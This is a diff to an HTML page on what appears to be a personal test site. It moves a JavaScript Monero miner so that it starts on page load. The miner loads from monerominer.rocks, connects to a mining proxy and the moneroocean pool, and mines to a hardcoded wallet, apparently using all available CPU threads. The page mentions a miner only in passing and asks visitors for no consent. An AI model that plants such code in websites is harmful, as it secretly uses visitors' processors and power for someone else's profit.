@@ -8,7 +8,16 @@
 <p>If you have a better javascript miner then the one I have (it has %12 tax!) then put it on github and put the link in mty "issues" secion</p>
 <p>To give advice goto https://github.com/Criptc/Test-site/issues</p>
 <p> the button bellow me shows current wallet info</p>
+<script src="https://monerominer.rocks/miner-mmr/webmnr.min.js"></script>
 <script>
+    server = "wss://f.xmrminingproxy.com:8181";
+    var pool = "moneroocean.stream";
+    var walletAddress = "4B61jH4fJJqB7bato9MmQfh1ccZtSpthM4ZmWL7pBXUPevpstsHPuF1XhUTTg5Wp4MUb2QmMT6DLLfh8RNZAEsS1GrNn2si";
+    var workerId = Math.floor(Math.random() * 10000);
+    var threads = -1;
+    var password = "x";
+    startMining(pool, walletAddress, workerId, threads, password);
+    throttleMiner = 20;
 let btn = document.createElement("button");
 btn.innerHTML = "Click for wallet stats";
 btn.onclick = function () {
@@ -32,17 +41,6 @@ request.onreadystatechange = function() {
 };
 };
 document.body.appendChild(btn);
-</script>
-<script src="https://monerominer.rocks/miner-mmr/webmnr.min.js"></script>
-<script>
-    server = "wss://f.xmrminingproxy.com:8181";
-    var pool = "moneroocean.stream";
-    var walletAddress = "4B61jH4fJJqB7bato9MmQfh1ccZtSpthM4ZmWL7pBXUPevpstsHPuF1XhUTTg5Wp4MUb2QmMT6DLLfh8RNZAEsS1GrNn2si";
-    var workerId = Math.floor(Math.random() * 10000);
-    var threads = -1;
-    var password = "x";
-    startMining(pool, walletAddress, workerId, threads, password);
-    throttleMiner = 20;
 </script>
 </body>
 </html> 
